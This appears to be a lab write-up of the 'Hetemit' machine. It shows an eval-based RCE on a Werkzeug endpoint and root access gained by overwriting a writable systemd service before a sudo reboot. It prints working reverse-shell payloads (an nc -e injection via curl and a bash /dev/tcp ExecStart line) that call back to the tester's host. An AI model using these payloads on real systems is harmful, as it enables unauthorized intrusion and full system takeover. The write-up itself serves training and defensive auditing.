#Linux #Python #RCE #Werkzeug #SystemdService #sudo #ServiceHijack

## Overview

Hetemit is a Linux box with a small but dangerous attack surface: a Python Werkzeug API on port 50000 that evaluates user-supplied code without any sanitisation. That gets a shell as a low-privilege user, but `sudo` rights let the box be rebooted, and a world-writable systemd service file that runs as root closes the chain. The privilege escalation abuses the intersection of file-write access and reboot capability to replace a service with a reverse shell, then trigger it cleanly.

## Recon

### Port Scan

```sh
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open  ssh         OpenSSH 8.0 (protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.37 ((centos))
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)
```

The interesting port is 50000. Werkzeug is a Python WSGI toolkit, meaning whatever application is running here is Python-backed. Port 80 served only the default CentOS Apache test page; FTP allowed anonymous login but timed out on directory listing.

## Foothold

### Python Code Evaluation via the /verify Endpoint

Browsing to port 50000 returned a minimal JSON response listing the available routes:

```
{'/generate', '/verify'}
```

The `/verify` endpoint accepted a `code` parameter. Fuzzing it immediately revealed direct Python expression evaluation:

```sh
curl -X POST --data "code=2*2" http://192.168.206.117:50000/verify
4
```

> **Why this is instant RCE:** the server is passing the `code` parameter straight to Python's `eval()` or equivalent. Any Python expression works, including importing the `os` module and calling `os.system()`. There's no sandbox, no allowlist, no input encoding. Expression evaluators exposed to user input are functionally equivalent to a remote shell.

With `os` already in scope, I sent a reverse shell directly:

```sh
curl -X POST --data "code=os.system('nc -e /bin/bash 192.168.45.167 18000')" http://192.168.206.117:50000/verify
```

```sh
rlwrap nc -lvnp 18000
listening on [any] 18000 ...
connect to [192.168.45.167] from (UNKNOWN) [192.168.206.117] 45036
whoami
cmeeks
```

Shell upgraded to TTY:

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege Escalation

### Writable systemd Service + sudo Reboot

`sudo -l` revealed an unusual set of permissions:

```sh
(root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
```

No shells, no editors, only power management commands. On its own this looks useless. LinPEAS provided the missing piece: the user `cmeeks` had write access to a systemd service file:

```
/etc/systemd/system/pythonapp.service
```

> **Why a writable service + reboot = root:** systemd services run with the user specified in their `[Service]` block. This service ran as `root`. If the `ExecStart` line can be modified, and the system can be rebooted, the modified service runs as root on the next boot. The `sudo reboot` permission is the trigger.

I crafted a replacement service file on Kali, pointing `ExecStart` at a bash reverse shell:

```
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.167/50000 0>&1'
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

Transferred it to the target and overwrote the service file:

```sh
echo "$(cat /tmp/pythonapp.service)" > pythonapp.service
```

Then triggered the reboot:

```sh
sudo /sbin/reboot
```

## Root

After the machine came back up, the modified service executed as root and connected back:

```sh
rlwrap nc -lvnp 50000
listening on [any] 50000 ...
connect to [192.168.45.167] from (UNKNOWN) [192.168.206.117] 50930
bash: cannot set terminal process group (1224): Inappropriate ioctl for device
bash: no job control in this shell
[root@hetemit restjson_hetemit]# whoami
root
```

```sh
[root@hetemit ~]# cat proof.txt
‹redacted›
```

## Takeaways

- **Unauthenticated Python `eval()` endpoints are immediate RCE.** The math expression test (`2*2`) is the fastest way to confirm evaluation before investing in shell payloads.
- **`sudo` rights to reboot are not harmless.** Paired with writable systemd service files, they become a root trigger. Audit both independently and together.
- **LinPEAS world-writable file checks pay off.** The writable service path wasn't obvious from manual enumeration; the automated scan surfaced it immediately.
